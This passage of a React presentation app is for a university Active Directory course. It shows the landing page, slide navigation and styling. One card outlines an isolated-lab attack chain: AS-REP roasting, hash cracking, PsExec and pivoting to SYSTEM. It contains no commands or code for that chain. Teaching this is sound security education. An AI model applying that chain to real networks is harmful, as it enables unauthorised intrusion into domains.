				setTyped(target.slice(0, i));
				i++;
			} else clearInterval(iv);
		}, 60);
		return () => clearInterval(iv);
	}, []);
	return (
		<div className="landing">
			<div className="scanlines" />
			<div className="landing-content">
				<div className="landing-badge">
					<span className="badge-dot" /> Network Administration · University of
					Laghouat
				</div>
				<h1 className="landing-title">
					{typed}
					<span className="cursor">█</span>
				</h1>
				<p className="landing-sub">
					Protocols, Concepts &amp; Practical Implementation
				</p>
				<div className="meta-row">
					<span className="meta-item">
						<span className="meta-icon">📋</span> 17 Slides
					</span>
					<span className="meta-div" />
					<span className="meta-item">
						<span className="meta-icon">⏱</span> ~30 min
					</span>
					<span className="meta-div" />
					<span className="meta-item">
						<span className="meta-icon">🧪</span> Live Lab Demo
					</span>
					<span className="meta-div" />
					<span className="meta-item">
						<span className="meta-icon">🛡</span> Isolated Environment
					</span>
				</div>
				<div className="info-cards">
					<div className="info-card" style={{ borderColor: "#38bdf860" }}>
						<div className="info-card-icon" style={{ color: "#38bdf8" }}>
							📚
						</div>
						<div className="info-card-title" style={{ color: "#38bdf8" }}>
							Part 0 — Theory
						</div>
						<p className="info-card-body">
							Understand what AD DS is, how the Forest/Domain/OU hierarchy
							works, and the protocols (LDAP, Kerberos, DNS) that power it.
						</p>
					</div>
					<div className="info-card" style={{ borderColor: "#34d39960" }}>
						<div className="info-card-icon" style={{ color: "#34d399" }}>
							🖥
						</div>
						<div className="info-card-title" style={{ color: "#34d399" }}>
							Part 1 — Build
						</div>
						<p className="info-card-body">
							Set up a Windows Server 2025 Domain Controller, create users,
							groups, OUs, and an intentionally misconfigured service account.
						</p>
					</div>
					<div className="info-card" style={{ borderColor: "#f8717160" }}>
						<div className="info-card-icon" style={{ color: "#f87171" }}>
							⚡
						</div>
						<div className="info-card-title" style={{ color: "#f87171" }}>
							Part 2 — Attack
						</div>
						<p className="info-card-body">
							AS-REP Roast the DC, crack the hash, PSExec in, pivot through the
							DC, and land SYSTEM on Win10 — all from Arch Linux.
						</p>
					</div>
				</div>
				<button className="start-btn" onClick={onStart}>
					<span>Start Presentation</span>
					<span className="btn-arrow">→</span>
				</button>
				<p className="landing-footer">
					Use <kbd>←</kbd> <kbd>→</kbd> arrow keys or on-screen buttons to
					navigate
				</p>
			</div>
		</div>
	);
}

function Presentation({ onExit }: { onExit: () => void }) {
	const [current, setCurrent] = useState(0);
	const total = slides.length;
	const prev = useCallback(() => setCurrent((c) => Math.max(0, c - 1)), []);
	const next = useCallback(
		() => setCurrent((c) => Math.min(total - 1, c + 1)),
		[total],
	);
	useEffect(() => {
		const h = (e: KeyboardEvent) => {
			if (e.key === "ArrowRight" || e.key === "ArrowDown") next();
			if (e.key === "ArrowLeft" || e.key === "ArrowUp") prev();
			if (e.key === "Escape") onExit();
		};
		window.addEventListener("keydown", h);
		return () => window.removeEventListener("keydown", h);
	}, [prev, next, onExit]);
	const slide = slides[current];
	return (
		<div className="pres-wrap">
			<div className="scanlines" />
			<div className="pres-topbar">
				<button className="exit-btn" onClick={onExit}>
					← Back
				</button>
				<div className="slide-counter">
					{String(current + 1).padStart(2, "0")} /{" "}
					{String(total).padStart(2, "0")}
				</div>
				<Pill label={slide.tag} color={slide.tagColor} />
			</div>
			<ProgressBar current={current} total={total} />
			<div className="slide" key={current}>
				<div className="slide-inner">
					<div className="slide-header">
						<h2 className="slide-title">{slide.title}</h2>
						{slide.subtitle && (
							<p className="slide-subtitle">{slide.subtitle}</p>
						)}
					</div>
					<div className="slide-body">{slide.content}</div>
				</div>
			</div>
			<div className="pres-nav">
				<button className="nav-btn" onClick={prev} disabled={current === 0}>
					← Prev
				</button>
				<div className="dot-row">
					{slides.map((_, i) => (
						<button
							key={i}
							className={`dot ${i === current ? "dot-active" : ""}`}
							onClick={() => setCurrent(i)}
						/>
					))}
				</div>
				<button
					className="nav-btn"
					onClick={next}
					disabled={current === total - 1}
				>
					Next →
				</button>
			</div>
		</div>
	);
}

export default function Home() {
	const [started, setStarted] = useState(false);
	return (
		<>
			<style>{`
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600;700&display=swap');
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: #050a0e; color: #cbd5e1; font-family: 'Inter', system-ui, sans-serif; font-size: 16px; line-height: 1.6; min-height: 100vh; overflow-x: hidden; }
        .scanlines { position: fixed; inset: 0; pointer-events: none; z-index: 0; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,100,0.012) 2px, rgba(0,255,100,0.012) 4px); }
        .landing { min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 3rem 1.5rem; position: relative; background: radial-gradient(ellipse at 50% 0%, #0d2218 0%, #050a0e 70%); }
        .landing-content { position: relative; z-index: 1; max-width: 940px; width: 100%; display: flex; flex-direction: column; align-items: center; gap: 2.25rem; text-align: center; }
        .landing-badge { display: flex; align-items: center; gap: 10px; font-size: 0.78rem; letter-spacing: 0.18em; color: #34d399; font-family: 'JetBrains Mono', monospace; border: 1px solid #34d39940; padding: 7px 20px; border-radius: 3px; }
        .badge-dot { width: 7px; height: 7px; background: #34d399; border-radius: 50%; animation: pulse 1.5s ease-in-out infinite; flex-shrink: 0; }
        @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
        .landing-title { font-size: clamp(2.4rem, 6vw, 4.2rem); font-weight: 700; color: #f1f5f9; letter-spacing: -0.03em; line-height: 1.1; font-family: 'Inter', sans-serif; }
        .cursor { display: inline-block; color: #34d399; animation: blink 0.9s step-end infinite; }
        @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0;} }
        .landing-sub { color: #64748b; font-size: 1.2rem; letter-spacing: 0.01em; font-weight: 400; }
        .meta-row { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; justify-content: center; }
        .meta-item { font-size: 0.95rem; color: #94a3b8; display: flex; align-items: center; gap: 7px; }
        .meta-icon { font-size: 1.1rem; }
        .meta-div { width: 1px; height: 18px; background: #1e293b; }
        .info-cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1.1rem; width: 100%; }
        .info-card { background: #0a1520; border: 1px solid; border-radius: 8px; padding: 1.6rem; text-align: left; transition: transform 0.2s, box-shadow 0.2s; }
        .info-card:hover { transform: translateY(-3px); box-shadow: 0 8px 30px rgba(0,0,0,0.35); }
        .info-card-icon { font-size: 1.8rem; margin-bottom: 0.65rem; }
        .info-card-title { font-size: 1.05rem; font-weight: 700; margin-bottom: 0.6rem; }
        .info-card-body { font-size: 0.92rem; color: #64748b; line-height: 1.7; }
        .start-btn { display: flex; align-items: center; gap: 14px; background: #34d399; color: #050a0e; border: none; padding: 1.1rem 2.8rem; font-family: 'Inter', sans-serif; font-size: 1.1rem; font-weight: 700; letter-spacing: 0.01em; cursor: pointer; border-radius: 6px; transition: all 0.2s; box-shadow: 0 4px 24px rgba(52,211,153,0.28); }
        .start-btn:hover { background: #6ee7b7; transform: scale(1.04); box-shadow: 0 6px 32px rgba(52,211,153,0.4); }
        .btn-arrow { font-size: 1.35rem; transition: transform 0.2s; }
        .start-btn:hover .btn-arrow { transform: translateX(5px); }
        .landing-footer { font-size: 0.85rem; color: #334155; }
        kbd { background: #1e293b; border: 1px solid #334155; padding: 2px 8px; border-radius: 3px; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; }
        .pres-wrap { min-height: 100vh; display: flex; flex-direction: column; background: radial-gradient(ellipse at 50% 0%, #0a1520 0%, #050a0e 80%); position: relative; }
        .pres-topbar { display: flex; align-items: center; justify-content: space-between; padding: 0.9rem 2.5rem; border-bottom: 1px solid #0f2030; position: relative; z-index: 1; }
        .exit-btn { background: none; border: 1px solid #1e293b; color: #64748b; font-family: 'JetBrains Mono', monospace; font-size: 0.84rem; padding: 5px 14px; cursor: pointer; border-radius: 3px; transition: all 0.2s; }
        .exit-btn:hover { border-color: #34d399; color: #34d399; }
        .slide-counter { font-size: 0.9rem; color: #334155; letter-spacing: 0.12em; font-family: 'JetBrains Mono', monospace; }
        .pill { font-size: 0.75rem; letter-spacing: 0.12em; border: 1px solid; padding: 4px 13px; border-radius: 3px; font-family: 'JetBrains Mono', monospace; }
        .progress-track { height: 2px; background: #0f2030; width: 100%; position: relative; z-index: 1; }
        .progress-fill { height: 100%; background: #34d399; transition: width 0.4s ease; }
        .slide { flex: 1; overflow-y: auto; padding: 2.75rem 2rem; position: relative; z-index: 1; display: flex; justify-content: center; animation: slideIn 0.25s ease; }
        @keyframes slideIn { from{opacity:0;transform:translateY(10px);} to{opacity:1;transform:none;} }
        .slide-inner { width: 100%; max-width: 980px; }
        .slide-header { margin-bottom: 1.9rem; border-bottom: 1px solid #0f2030; padding-bottom: 1.15rem; }
        .slide-title { font-size: clamp(1.9rem, 3.5vw, 2.6rem); font-weight: 700; color: #f1f5f9; font-family: 'Inter', sans-serif; letter-spacing: -0.025em; }
        .slide-subtitle { font-size: 1.05rem; color: #475569; margin-top: 0.4rem; font-weight: 400; }
        .slide-body { width: 100%; }
        .pres-nav { display: flex; align-items: center; justify-content: space-between; padding: 0.9rem 2.5rem; border-top: 1px solid #0f2030; position: relative; z-index: 1; }
        .nav-btn { background: none; border: 1px solid #1e293b; color: #94a3b8; font-family: 'JetBrains Mono', monospace; font-size: 0.84rem; padding: 7px 20px; cursor: pointer; border-radius: 3px; transition: all 0.2s; }
        .nav-btn:hover:not(:disabled) { border-color: #34d399; color: #34d399; }
        .nav-btn:disabled { opacity: 0.2; cursor: default; }
        .dot-row { display: flex; gap: 7px; flex-wrap: wrap; justify-content: center; }
        .dot { width: 8px; height: 8px; border-radius: 50%; background: #1e293b; border: none; cursor: pointer; transition: all 0.2s; }
        .dot:hover { background: #475569; }
        .dot-active { background: #34d399 !important; }
        .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 2.5rem; }
        @media (max-width: 720px) { .two-col { grid-template-columns: 1fr; } }
        .section-header { font-size: 0.73rem; letter-spacing: 0.2em; color: #34d399; text-transform: uppercase; margin: 1.35rem 0 0.65rem; border-left: 2px solid #34d399; padding-left: 10px; font-family: 'JetBrains Mono', monospace; }
        .body-text { font-size: 1rem; color: #94a3b8; line-height: 1.8; }
        .blist { list-style: none; display: flex; flex-direction: column; gap: 7px; }
        .blist li { font-size: 0.95rem; color: #94a3b8; display: flex; align-items: flex-start; gap: 9px; line-height: 1.65; }
        .blist-dot { color: #34d399; flex-shrink: 0; margin-top: 3px; }
        .term-row { display: flex; gap: 0.9rem; align-items: baseline; padding: 7px 0; border-bottom: 1px solid #0f2030; font-size: 0.93rem; }
        .term { color: #38bdf8; font-weight: 600; white-space: nowrap; min-width: 95px; font-family: 'JetBrains Mono', monospace; font-size: 0.83rem; }
        .term-def { color: #64748b; line-height: 1.55; }
        .alert { display: flex; align-items: flex-start; gap: 13px; border-left: 3px solid; padding: 13px 17px; background: rgba(255,255,255,0.02); border-radius: 4px; margin: 1.2rem 0; font-size: 0.93rem; line-height: 1.65; }
        .alert-icon { font-size: 1.1rem; flex-shrink: 0; font-weight: 700; margin-top: 1px; }
        .code-block { background: #060e18; border: 1px solid #0f2030; border-radius: 6px; overflow: hidden; margin: 0.65rem 0; }
        .code-header { display: flex; justify-content: space-between; align-items: center; padding: 7px 15px; background: #0a1520; border-bottom: 1px solid #0f2030; }
        .code-lang { font-size: 0.73rem; color: #34d399; letter-spacing: 0.1em; font-family: 'JetBrains Mono', monospace; }
        .copy-btn { font-size: 0.73rem; color: #475569; background: none; border: none; cursor: pointer; font-family: 'JetBrains Mono', monospace; letter-spacing: 0.05em; transition: color 0.2s; }
        .copy-btn:hover { color: #34d399; }
        .code-pre { padding: 1.15rem 1.3rem; overflow-x: auto; font-size: 0.87rem; line-height: 1.8; color: #7dd3fc; white-space: pre; font-family: 'JetBrains Mono', monospace; }
        .step-list { display: flex; flex-direction: column; gap: 1rem; margin: 0.65rem 0; }
        .step-item { display: flex; gap: 1rem; align-items: flex-start; }
        .step-num { font-size: 0.75rem; color: #34d399; font-weight: 700; letter-spacing: 0.05em; margin-top: 3px; min-width: 26px; font-family: 'JetBrains Mono', monospace; }
        .step-body { flex: 1; }
        .step-title { font-size: 1rem; color: #e2e8f0; font-weight: 600; }
        .step-desc { font-size: 0.88rem; color: #475569; margin-top: 3px; line-height: 1.6; }
        .agenda-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; }
        @media (max-width: 620px) { .agenda-grid { grid-template-columns: 1fr; } }
        .agenda-item { display: flex; align-items: center; gap: 0.9rem; border: 1px solid; padding: 0.8rem 1.1rem; border-radius: 5px; background: rgba(255,255,255,0.01); }
        .agenda-n { font-size: 0.8rem; font-weight: 700; letter-spacing: 0.05em; flex-shrink: 0; font-family: 'JetBrains Mono', monospace; }
        .agenda-label { font-size: 0.95rem; color: #94a3b8; }
        .proto-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(218px, 1fr)); gap: 1rem; margin-bottom: 1rem; }
        .proto-card { background: #060e18; border: 1px solid; border-radius: 7px; padding: 1.15rem; }
        .proto-head { display: flex; align-items: center; gap: 10px; margin-bottom: 0.9rem; }
        .proto-icon { font-size: 1.4rem; }
        .proto-name { font-size: 1rem; font-weight: 700; letter-spacing: 0.03em; }
        .lab-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(230px, 1fr)); gap: 1.1rem; margin: 1.1rem 0; }
        .vm-card { border: 1px solid; padding: 1.15rem; border-radius: 7px; background: #060e18; }
        .vm-header { display: flex; align-items: center; gap: 9px; font-size: 0.97rem; font-weight: 700; margin-bottom: 5px; }
        .vm-dot { width: 9px; height: 9px; border-radius: 50%; flex-shrink: 0; }
        .vm-role { font-size: 0.85rem; color: #475569; margin-bottom: 0.9rem; }
        .hv-row { display: flex; gap: 0.9rem; flex-wrap: wrap; margin-top: 0.65rem; }
        .defense-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(230px, 1fr)); gap: 1.1rem; }
        .defense-card { border: 1px solid; padding: 1.15rem; border-radius: 7px; background: #060e18; }
        .defense-icon { font-size: 1.65rem; margin-bottom: 0.6rem; }
        .defense-title { font-size: 0.97rem; font-weight: 700; margin-bottom: 0.9rem; letter-spacing: 0.02em; }
        .summary-wrap { display: flex; flex-direction: column; gap: 1.85rem; }
        .summary-cols { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
        .summary-cols.three { grid-template-columns: 1fr 1fr 1fr; }
        @media (max-width: 720px) { .summary-cols, .summary-cols.three { grid-template-columns: 1fr; } }
        .summary-col { background: #060e18; border: 1px solid #0f2030; padding: 1.4rem; border-radius: 7px; }
        .summary-col-title { font-size: 0.97rem; font-weight: 700; margin-bottom: 0.95rem; letter-spacing: 0.02em; }
        .big-quote { font-size: 1.25rem; color: #e2e8f0; line-height: 1.8; border-left: 3px solid #a78bfa; padding-left: 1.5rem; font-style: italic; font-family: 'Inter', sans-serif; }
        .quote-attr { font-size: 0.88rem; color: #475569; margin-top: 0.65rem; font-style: normal; }
      `}</style>
			{started ? (
				<Presentation onExit={() => setStarted(false)} />
			) : (
				<Landing onStart={() => setStarted(true)} />
			)}
		</>
	);
}
